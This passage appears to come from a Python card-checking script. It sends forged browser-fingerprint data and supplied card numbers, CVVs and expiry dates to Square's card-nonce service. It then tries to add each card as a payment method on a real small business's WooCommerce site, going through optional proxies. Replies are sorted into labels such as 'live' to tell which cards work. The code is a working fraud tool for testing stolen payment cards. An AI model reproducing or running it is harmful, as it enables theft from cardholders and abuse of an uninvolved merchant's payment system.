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"},"touch_support":{"maxTouchPoints":5,"touchEvent":true,"touchStart":true},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false,"math":{"acos":1.4473588658278522,"acosh":709.889355822726,"acoshPf":355.291251501643,"asin":0.12343746096704435,"asinh":0.881373587019543,"asinhPf":0.8813735870195429,"atanh":0.5493061443340548,"atanhPf":0.5493061443340548,"atan":0.4636476090008061,"sin":0.8178819121159085,"sinh":1.1752011936438014,"sinhPf":2.534342107873324,"cos":-0.8390715290095377,"cosh":1.5430806348152437,"coshPf":1.5430806348152437,"tan":-1.4214488238747245,"tanh":0.7615941559557649,"tanhPf":0.7615941559557649,"exp":2.718281828459045,"expm1":1.718281828459045,"expm1Pf":1.718281828459045,"log1p":2.3978952727983707,"log1pPf":2.3978952727983707,"powPI":1.9275814160560204e-50},"video_card":{"vendor":"Google Inc. (Qualcomm)","renderer":"ANGLE (Qualcomm, Adreno (TM) 810, OpenGL ES 3.2)"},"pdf_viewer_enabled":false}',
                                "fingerprint": "468bf468fe02f32e80acd928da7c720a",
                                "version": "fingerprint-v2",
                            },
                        ],
                        "timezone": "-180",
                        "website_url": "https://www.nancynixrice.com/",
                    },
                    "client_id": ap,
                    "instance_id": inn,
                    "location_id": lo,
                    "payment_method_tracking_id": sess,
                    "session_id": se,
                    "card_data": {
                        "cvv": card_data["cvv"],
                        "exp_month": int(card_data["mm"]),
                        "exp_year": int(card_data["yy"]),
                        "number": card_data["cc"],
                    },
                    "pow_counter": var,
                }
                resp_nonce = await session.post(
                    "https://pci-connect.squareup.com/v2/card-nonce",
                    params=params_nonce,
                    headers=headers_nonce,
                    json=json_nonce,
                )
                nonce_json = resp_nonce.json()
                cnon = nonce_json.get("card_nonce")
                if not cnon:
                    return "Error", "Failed to get card nonce", False

                # 10. Final POST to add payment method
                headers_final = {
                    "origin": "https://www.nancynixrice.com",
                    "referer": "https://www.nancynixrice.com/my-account/add-payment-method/",
                    "content-type": "application/x-www-form-urlencoded",
                }
                data_final = {
                    "payment_method": "square_credit_card",
                    "wc-square-credit-card-payment-nonce": cnon,
                    "wc-square-credit-card-payment-postcode": "",
                    "wc-square-credit-card-buyer-verification-token": "",
                    "wc-square-credit-card-verified-token": "",
                    "wc-square-credit-card-tokenize-payment-method": "true",
                    "woocommerce-add-payment-method-nonce": add_nonce,
                    "_wp_http_referer": "/my-account/add-payment-method/",
                    "woocommerce_add_payment_method": "1",
                }
                resp_final = await session.post(
                    "https://www.nancynixrice.com/my-account/add-payment-method/",
                    headers=headers_final,
                    data=data_final,
                )
                response_text = resp_final.text.lower()

                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_SQ_2(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )